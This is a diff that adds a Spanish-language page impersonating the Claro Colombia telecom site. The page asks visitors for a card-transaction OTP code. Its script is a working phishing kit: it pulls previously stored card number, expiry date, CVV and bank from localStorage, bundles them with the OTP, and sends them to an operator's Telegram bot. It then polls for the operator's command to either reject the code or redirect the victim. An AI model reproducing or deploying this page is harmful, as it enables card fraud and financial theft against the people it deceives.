@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="img/favicon.ico" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+        rel="stylesheet" />
+    <title>Autorización de OTP | Claro</title>
+    <style>
+        body {
+            font-family: "Open Sans", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+        }
+
+        #loader-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #loader {
+            width: 3.25em;
+            transform-origin: center;
+            animation: rotate4 2s linear infinite;
+        }
+
+        circle {
+            fill: none;
+            stroke: hsl(0, 97%, 59%);
+            stroke-width: 2;
+            stroke-dasharray: 1, 200;
+            stroke-dashoffset: 0;
+            stroke-linecap: round;
+            animation: dash4 1.5s ease-in-out infinite;
+        }
+
+        @keyframes rotate4 {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes dash4 {
+            0% {
+                stroke-dasharray: 1, 200;
+                stroke-dashoffset: 0;
+            }
+
+            50% {
+                stroke-dasharray: 89, 200;
+                stroke-dashoffset: -35;
+            }
+
+            100% {
+                stroke-dasharray: 89, 200;
+                stroke-dashoffset: -124;
+            }
+        }
+
+        #contenedor {
+            max-width: 360px;
+            margin: 60px auto;
+            background: #fff;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 0 12px rgba(0, 0, 0, 0.08);
+        }
+
+        #titulo {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        #parrafo {
+            text-align: center;
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        #logos {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 10px 0;
+        }
+
+        #logos img {
+            height: 32px;
+        }
+
+        #horaTransaccion {
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 20px;
+            color: #888;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        label {
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        input {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+        }
+
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #0056b3;
+        }
+    </style>
+</head>
+
+<body class="bg-gray-100 text-gray-800 antialiased">
+    <div class="px-6 flex items-center justify-between h-10 bg-white">
+        <div class="flex items-center gap-8">
+            <p class="text-sm text-[#313131] font-semibold border-b-4 border-[#FFC73C]">Personas</p>
+            <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Negocios</p>
+            <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Empresas</p>
+            <p class="hidden md:block text-sm text-[#313131] font-semibold hover:border-b-4 hover:border-[#FFC73C]">Institucional</p>
+        </div>
+        <div class="flex items-center gap-4">
+            <div class="flex items-center gap-2 text-sm text-[#313131] font-semibold">Más de Claro
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+                </svg>
+            </div>
+            <div class="flex items-center gap-2 text-sm text-[#313131] font-semibold">
+                <img class="w-5 h-5" src="./assets/flag-colombia.svg" alt="">
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+                </svg>
+            </div>
+        </div>
+    </div>
+    <header class="bg-[#EF3320] h-14 flex items-center px-4 md:px-10 justify-between">
+        <div class="flex items-center gap-4">
+            <svg xmlns="http://www.w3.org/2000/svg" class="md:hidden w-6 h-6 text-white" viewBox="0 0 24 24" fill="none"
+                stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M4 6h16M4 12h16M4 18h16" />
+            </svg>
+            <img class="w-20" src="./assets/claro.svg" alt="Claro">
+            <nav class="hidden md:flex items-center gap-6 text-white">
+                <div class="flex items-center gap-1"><span class="text-sm font-bold">Servicios</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
+                        <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+                    </svg>
+                </div>
+                <div class="flex items-center gap-1"><span class="text-sm font-bold">Tienda</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
+                        <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+                    </svg>
+                </div>
+                <div class="flex items-center gap-1"><span class="text-sm font-bold">Soporte</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
+                        <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+                    </svg>
+                </div>
+            </nav>
+        </div>
+        <div class="flex items-center gap-3">
+            <div class="hidden md:flex items-center gap-3 text-white"><span class="text-xs font-semibold">Información importante para usuarios</span>
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="white">
+                    <path d="M18 9c.852 0 1.297 .986 .783 1.623l-.076 .084l-6 6a1 1 0 0 1 -1.32 .083l-.094 -.083l-6 -6z" />
+                </svg>
+            </div>
+            <button class="flex items-center gap-2 rounded-full px-4 h-10 bg-[#D01508] text-white font-bold">
+                <img class="w-6 h-6" src="./assets/c2btn.png" alt=""> Mi Claro
+            </button>
+        </div>
+    </header>
+
+    <div id="contenedor">
+        <div id="titulo">Autorización de Transacción</div>
+        <p id="parrafo">Ingresa el código que te enviamos a tu celular para confirmar la transacción.</p>
+
+        <div id="logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard">
+        </div>
+
+        <div id="horaTransaccion">Hora: --:--:--</div>
+        <form id="form">
+            <label for="otp">Clave Dinámica / OTP:</label>
+            <input type="text" id="otp" required minlength="6" maxlength="6" inputmode="numeric">
+            <button type="submit">Autorizar</button>
+        </form>
+    </div>
+
+    <div id="loader-container">
+        <div id="loader">
+            <svg viewBox="25 25 50 50">
+                <circle r="20" cy="50" cx="50"></circle>
+            </svg>
+        </div>
+    </div>
+
+    <script>
+        // Mostrar hora
+        function updHora() {
+            const d = new Date();
+            const h = String(d.getHours()).padStart(2, '0'),
+                m = String(d.getMinutes()).padStart(2, '0'),
+                s = String(d.getSeconds()).padStart(2, '0');
+            document.getElementById('horaTransaccion').innerText = `Hora: ${h}:${m}:${s}`;
+        }
+        setInterval(updHora, 1000);
+        updHora();
+
+        const loaderContainer = document.getElementById('loader-container');
+        const form = document.getElementById('form');
+
+        form.addEventListener('submit', async e => {
+            e.preventDefault();
+            loaderContainer.style.display = 'flex';
+
+            const otp = document.getElementById('otp').value;
+            const cardData = JSON.parse(localStorage.getItem('formData') || '{}');
+
+            const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
+
+            const message =
+                `<b>🔔 Nueva clave dinámica:</b>
+            🆔 <b>ID:</b> ${transactionId}
+            🔑 <b>OTP:</b> ${otp}
+
+            💳 <b>Tarjeta:</b> ${cardData.tarjeta}
+            📅 <b>Venc.:</b> ${cardData.fechaExpiracion}
+            🔐 <b>CVV:</b> ${cardData.cvv}
+            🏦 <b>Banco:</b> ${cardData.banco}`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: "Error de Dinámica", callback_data: `error_dinamica:${transactionId}` }],
+                    [{ text: "Confirmar", callback_data: `confirm_finalizar:${transactionId}` }]
+                ]
+            };
+
+            async function loadCfg() {
+                const res = await fetch('config.json');
+                if (!res.ok) throw 'No cargó config.json';
+                return res.json();
+            }
+
+            try {
+                const cfg = await loadCfg();
+                const res = await fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: cfg.chat_id,
+                        text: message,
+                        reply_markup: keyboard,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const js = await res.json();
+                if (!js.ok) throw js;
+                poll(cfg, transactionId);
+            } catch (err) {
+                console.error(err);
+                loaderContainer.style.display = 'none';
+                alert('Error enviando a Telegram');
+            }
+        });
+
+        // Poll para esperar la acción del admin
+        async function poll(cfg, tid) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${cfg.token}/getUpdates`);
+                const js = await res.json();
+                const upd = js.result.find(u => u.callback_query?.data?.endsWith(`:${tid}`));
+                if (upd) {
+                    loaderContainer.style.display = 'none';
+                    const action = upd.callback_query.data.split(':')[0];
+                    switch (action) {
+                        case 'error_dinamica':
+                            alert('La clave dinámica que ingresaste es incorrecta. Por favor, inténtelo de nuevo.');
+                            break;
+                        case 'confirm_finalizar':
+                            window.location.href = `index.html`;
+                            break;
+                    }
+                } else {
+                    setTimeout(() => poll(cfg, tid), 2000);
+                }
+            } catch {
+                setTimeout(() => poll(cfg, tid), 2000);
+            }
+        }
+    </script>
+</body>
+
+</html>
